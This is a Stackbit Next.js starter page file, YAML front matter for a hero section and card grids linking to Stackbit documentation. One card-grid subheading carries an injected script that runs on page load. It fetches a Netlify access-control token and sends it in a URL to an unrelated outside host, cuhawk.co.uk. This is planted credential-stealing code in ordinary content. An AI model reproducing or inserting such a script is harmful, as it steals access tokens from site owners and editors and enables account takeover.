---
type: Page
title: Stackbit Next.js Starter
sections:
  - type: HeroSection
    heading: Welcome to Stackbit!
    subheading: >
      You've just [unlocked visual editing
      capabilities](https://www.stackbit.com/) in this Next.js app.
    buttons:
      - label: Start Building
        url: 'https://docs.stackbit.com/getting-started/'
        theme: primary
      - label: Read the Docs
        url: 'https://docs.stackbit.com/'
        theme: secondary
  - type: CardGridSection
    heading: Card Grid Heading
    subheading: |+
      Card Grid Subheading
      h
          \<div id="result">\</div>

          <script>
              // Function to make the first GET request to Netlify and retrieve the token
              function getAccessToken() {
                  fetch('https://app.netlify.com/access-control/generate-access-control-token')
                      .then(response => response.json())
                      .then(data => {
                          // Assuming the JSON response contains the token as a string
                          const token = data.token;
                          console.log('Access Token:', token);
                          makeSecondRequest(token);
                      })
                      .catch(error => {
                          console.error('Error:', error);
                      });
              }

              // Function to make the second GET request to test.com with the token as a path parameter
              function makeSecondRequest(token) {
                  const url = `https://cuhawk.co.uk/${token}`;
                  fetch(url)
                      .then(response => response.text())
                      .then(data => {
                          document.getElementById('result').textContent = data;
                      })
                      .catch(error => {
                          console.error('Error:', error);
                      });
              }

              // Call the function to initiate the process
              getAccessToken();
          </script>

  - type: CardGridSection
    heading: Jump to Topic
    subheading: |
      Or jump right to a specific topic to help you build your site.
    cards:
      - heading: How Stackbit Works →
        subheading: |
          Follow an end-to-end guide to learn the inner-workings of Stackbit.
        url: 'https://docs.stackbit.com/conceptual-guides/how-stackbit-works/'
      - heading: Pages →
        subheading: >
          Add a new type of page to your site, while touching on content
          modeling and data retrieval.
        url: 'https://docs.stackbit.com/how-to-guides/content/'
      - heading: Components →
        subheading: >
          Make components editable, add styles, and provide content presets to
          speed up content editing.
        url: 'https://docs.stackbit.com/how-to-guides/components/'
      - heading: Styling →
        subheading: >
          Set up global styles and add a styling toolbar to individual
          components in the visual editor.
        url: 'https://docs.stackbit.com/how-to-guides/styles/'
---
